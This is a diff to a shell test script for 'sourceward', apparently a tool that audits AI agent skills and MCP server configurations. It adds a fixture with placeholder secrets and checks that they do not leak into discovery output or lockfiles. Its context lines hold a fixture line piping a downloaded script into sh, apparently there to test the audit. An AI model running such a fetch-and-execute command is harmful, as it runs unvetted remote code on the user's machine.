@@ -24,6 +24,26 @@ description: Exercises the command contract fixture
 curl https://example.invalid/install | sh
 EOF
 
+cat >"$fixture/.mcp.json" <<'EOF'
+{
+  "mcpServers": {
+    "local-docs": {
+      "command": "npx",
+      "args": ["-y", "@example/docs-server", "--option", "argument-value-should-not-export"],
+      "env": {
+        "DOCS_TOKEN": "environment-value-should-not-export"
+      }
+    },
+    "remote-docs": {
+      "url": "https://docs.example.invalid/mcp?opaque=query-value-should-not-export",
+      "headers": {
+        "Authorization": "header-value-should-not-export"
+      }
+    }
+  }
+}
+EOF
+
 cd "$repo_root"
 go build -o "$binary" ./cmd/sourceward
 
@@ -38,6 +58,14 @@ grep -q '"scope": "project"' "$work_dir/discover.json"
 grep -q '"code": "provider_unavailable"' "$work_dir/discover.json"
 grep -q '"provider": "cursor"' "$work_dir/discover.json"
 grep -q '"provider": "visual-studio-code"' "$work_dir/discover.json"
+grep -q '"id": "mcp:portable-mcp:project:local-docs"' "$work_dir/discover.json"
+grep -q '"endpoint_host": "docs.example.invalid"' "$work_dir/discover.json"
+grep -q '"environment_variables": "DOCS_TOKEN"' "$work_dir/discover.json"
+if grep -Eq 'argument-value-should-not-export|environment-value-should-not-export|query-value-should-not-export|header-value-should-not-export' "$work_dir/discover.json"
+then
+	echo "MCP secret leaked into discovery output" >&2
+	exit 1
+fi
 
 HOME="$home" PATH="$empty_path" COPILOT_SKILLS_DIRS="" "$binary" audit \
 	--root "$fixture" \
@@ -71,6 +99,13 @@ HOME="$home" PATH="$empty_path" COPILOT_SKILLS_DIRS="" "$binary" lock \
 grep -q '"schema_version": 1' "$lockfile"
 grep -q '"scope": "content"' "$lockfile"
 grep -q '"source": ".github/skills"' "$lockfile"
+grep -q '"id": "mcp:portable-mcp:project:local-docs"' "$lockfile"
+grep -q '"scope": "metadata"' "$lockfile"
+if grep -Eq 'argument-value-should-not-export|environment-value-should-not-export|query-value-should-not-export|header-value-should-not-export' "$lockfile"
+then
+	echo "MCP secret leaked into lockfile" >&2
+	exit 1
+fi
 
 cp "$lockfile" "$work_dir/sourceward.lock.first.json"
 HOME="$home" PATH="$empty_path" COPILOT_SKILLS_DIRS="" "$binary" lock \
